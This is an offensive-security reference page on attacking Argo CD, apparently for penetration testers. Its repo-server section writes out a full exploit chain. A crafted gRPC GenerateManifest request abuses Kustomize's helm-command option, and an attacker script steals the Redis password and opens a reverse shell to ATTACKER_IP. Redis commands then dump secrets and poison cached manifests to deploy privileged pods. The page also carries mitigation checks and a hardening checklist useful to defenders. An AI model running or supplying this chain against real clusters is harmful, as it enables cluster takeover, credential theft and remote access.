ARGOCD PENTEST

Offensive Security Reference

Argo CD Architecture & Attack Surface

Argo CD is a Kubernetes-native GitOps continuous deployment controller. It watches Git repositories for desired state and reconciles that state into target clusters. Understanding its architecture is the foundation for every attack path.

Core Components

ComponentDefault PortFunctionAttack Relevance
argocd-server443 / 80 / 8080API server, UI, gRPC gatewayPrimary external attack surface. Handles authn, authz, session mgmt
argocd-repo-server8081 (gRPC)Clones repos, generates manifests via Helm/KustomizeUnauthenticated internal gRPC. RCE via kustomize abuse. Access = cluster takeover
argocd-application-controller8082Reconciles desired vs live state. Applies manifests to clustersRuns with cluster-admin by default. Controls what gets deployed
argocd-dex-server5556 / 5557OIDC/SSO identity brokerSSO bypass, token manipulation, OIDC misconfig
argocd-redis6379Caching layer for repo/app stateCache poisoning → manifest injection. Often no TLS, weak/default auth
argocd-notifications-controller—Sends alerts on sync/health eventsSSRF via webhook destinations, credential leakage in templates

Data Flow

1
Git Push → Webhook notifies argocd-server of new commit
2
argocd-server → Tells repo-server to fetch + generate manifests
3
argocd-repo-server → Clones repo, runs Helm/Kustomize, caches result in Redis
4
argocd-application-controller → Compares cached desired state vs live cluster state
5
Sync → Controller applies manifests to target cluster using stored credentials
Why Argo CD is a Tier-Zero Target
Argo CD concentrates Git repo credentials, cluster admin tokens, and deployment authority in one place. Compromise = control over what runs in production across all managed clusters.

RBAC & Authorization Exploitation

Understanding ArgoCD RBAC

ArgoCD uses a Casbin-based RBAC engine configured in argocd-rbac-cm. Policies follow the format: p, <role>, <resource>, <action>, <object>, <effect>

bash
# Dump RBAC policy kubectl get cm argocd-rbac-cm -n argocd -o yaml # Key fields: # policy.default: role:readonly ← default role for authenticated users # policy.csv: | ← custom policies # p, role:developer, applications, sync, */*, allow # g, my-team, role:developer # Check if default role is overly permissive kubectl get cm argocd-rbac-cm -n argocd \ -o jsonpath='{.data.policy\.default}' # Dangerous values: role:admin, or no policy.default (falls back to '') # Check scopes - which JWT claim is used for group mapping kubectl get cm argocd-rbac-cm -n argocd \ -o jsonpath='{.data.scopes}' # Default: '[groups]' — controls which OIDC claim feeds into RBAC

Repo-Server RCE (Unpatched)

CRITICAL UNPATCHED Synacktiv disclosure, July 2026. No CVE assigned. No fix available.

Attack Overview

The argocd-repo-server exposes an internal gRPC service (GenerateManifest) with no authentication. Anyone who can reach port 8081 can send a crafted request that abuses Kustomize's --helm-command option to execute arbitrary commands.

Prerequisites

  • Network access to repo-server on port 8081 (from compromised pod, CI job, misconfigured service mesh, or exposed service)
  • Network access to Redis on port 6379 (for cache poisoning phase)
  • The target Argo CD instance uses Kustomize (very common)

Attack Chain

1
Reach repo-server gRPC (8081) — From compromised pod in same cluster. No auth required.
2
Send crafted GenerateManifest request — Set Kustomize options with --enable-helm --helm-command /path/to/script pointing to attacker-controlled Git repo.
3
Kustomize executes attacker script — Instead of invoking Helm, it runs the malicious script from the cloned repo.
4
Read REDIS_PASSWORD from environment — The repo-server pod has this env var set. env | grep REDIS
5
Connect to Redis, poison cached manifests — Replace legitimate cached manifests with malicious ones (e.g., privileged pod with hostPID/hostNetwork).
6
Auto Sync deploys malicious manifest — Application controller reads poisoned cache, applies to target cluster with cluster-admin privileges.
7
Cluster takeover — Attacker workload runs with full authority Argo CD carries.

Exploitation Steps

bash
# Step 1: Verify connectivity from compromised pod nc -zv argocd-repo-server.argocd.svc.cluster.local 8081 nc -zv argocd-redis.argocd.svc.cluster.local 6379 # Step 2: Install grpcurl in compromised pod (or bring static binary) # Send GenerateManifest request with malicious kustomize options grpcurl -plaintext \ -d '{ "repo": {"repo": "https://github.com/attacker/evil-repo"}, "revision": "main", "path": ".", "kustomize_options": { "build_options": "--enable-helm --helm-command ./exploit.sh" } }' \ argocd-repo-server.argocd.svc.cluster.local:8081 \ repository.RepoServerService/GenerateManifest # Step 3: Inside exploit.sh in the attacker's Git repo: #!/bin/sh # Exfiltrate Redis password env | grep REDIS > /tmp/out # Or reverse shell sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 # Step 4: Connect to Redis with stolen password redis-cli -h argocd-redis.argocd.svc.cluster.local -a "$REDIS_PASSWORD" # Step 5: Enumerate and poison cache # List keys to find cached manifest entries redis-cli -h argocd-redis.argocd.svc.cluster.local -a "$REDIS_PASSWORD" \ KEYS "git-*" # Replace cached manifest with malicious YAML # (The exact key format depends on the app/revision being cached)
Detection Checks
During an assessment, verify whether the target has Kubernetes NetworkPolicies enforced in the argocd namespace. Argo CD ships default policies but Helm installations disable them by default (global.networkPolicy.create: false). Also check if Redis auth is enabled and if TLS is configured between components.

Mitigation Verification

bash
# Check if NetworkPolicies exist kubectl get networkpolicy -n argocd # Verify the Helm values helm get values argocd -n argocd | grep -A5 networkPolicy # Check Redis authentication kubectl exec -n argocd deploy/argocd-redis -- redis-cli ping # If NOAUTH → auth is disabled # Check Redis TLS kubectl get cm argocd-cmd-params-cm -n argocd -o yaml | grep redis

Redis Cache Attacks

Redis in Argo CD Context

Redis stores the manifest cache, repo cache, and app state. It is the bridge between repo-server and application-controller. Historically, Redis runs without TLS and without authentication in many deployments.

Unauthenticated Access

bash
# Test unauthenticated access redis-cli -h argocd-redis.argocd.svc.cluster.local PING # PONG = no auth # If auth is required, password is often in: # 1. repo-server environment: REDIS_PASSWORD # 2. argocd-secret: REDIS_PASSWORD key # 3. argocd-cmd-params-cm ConfigMap kubectl get secret argocd-secret -n argocd \ -o jsonpath='{.data.redis\.password}' | base64 -d # Dump all keys redis-cli -h argocd-redis.argocd.svc.cluster.local KEYS "*" # Look for cached manifests redis-cli -h argocd-redis.argocd.svc.cluster.local KEYS "git-*" redis-cli -h argocd-redis.argocd.svc.cluster.local KEYS "manifest-*" # Dump a specific cached manifest redis-cli -h argocd-redis.argocd.svc.cluster.local \ GET "git--"

Cache Poisoning for Manifest Injection

bash
# Replace cached manifest with privileged pod # First, read the existing cached value to understand the format redis-cli -h argocd-redis.argocd.svc.cluster.local \ GET "" > /tmp/original.json # Modify the manifest to include a malicious workload # Then write it back: redis-cli -h argocd-redis.argocd.svc.cluster.local \ SET "" '' # When Auto Sync fires, the application-controller reads the # poisoned cache and deploys the attacker's manifest # If Auto Sync is NOT enabled, wait for manual sync or trigger via API
CVE-2024-31989
A prior Redis-related vulnerability demonstrated that unprivileged pods could access Argo CD's Redis instance and manipulate cached data. The repo-server RCE chain revives this attack path.

Hardening & Security Assessment Checklist

Authentication & Access Control

  • Initial admin secret deleted after setup (argocd-initial-admin-secret)
  • Admin password changed from default (pod name)
  • SSO/OIDC configured; local accounts disabled where possible
  • API tokens have appropriate expiry (not indefinite)
  • RBAC policy.default is role:readonly or more restrictive, not role:admin
  • OIDC scopes correctly mapped in argocd-rbac-cm
  • No wildcard policies (*, *, *) in policy.csv
  • Exec disabled unless explicitly required (exec.enabled)
  • User accounts follow least privilege per project

Network Security

  • Kubernetes NetworkPolicies enforced in argocd namespace
  • Repo-server gRPC (8081) not reachable from non-ArgoCD pods
  • Redis (6379) not reachable from non-ArgoCD pods
  • Dex (5556/5557) not reachable from non-ArgoCD pods
  • ArgoCD server not exposed to internet without WAF/auth proxy
  • TLS enabled between all ArgoCD components
  • TLS enabled for Redis connections
  • Webhook endpoints validated with shared secrets

Secret Management

  • Redis authentication enabled with strong password
  • etcd encryption at rest enabled (protects Redis password in secrets)
  • Git credentials use short-lived tokens, not long-lived passwords
  • Cluster credentials follow least privilege (not cluster-admin)
  • server.secretkey rotated periodically
  • No plaintext secrets in argocd-cm ConfigMap
  • Webhook secrets configured for all connected Git providers

Deployment Configuration

  • ArgoCD runs in a dedicated namespace with restricted access
  • Pod Security Standards enforced on ArgoCD pods
  • Resource exclusions don't block security-relevant resources from sync
  • Application projects restrict destination clusters and namespaces
  • Projects restrict sourceRepos to known-good repositories
  • ClusterResourceWhitelist is scoped (not */*)
  • Auto-sync + self-heal reviewed for security implications
  • Notifications configured for security-relevant events

Monitoring & Detection

  • API audit logging enabled
  • Monitor for new account creation or token generation
  • Alert on application source changes
  • Alert on new cluster or repository additions
  • Monitor for unusual ServerSideDiff API calls
  • Monitor Redis for unexpected client connections
  • Monitor repo-server for anomalous outbound connections
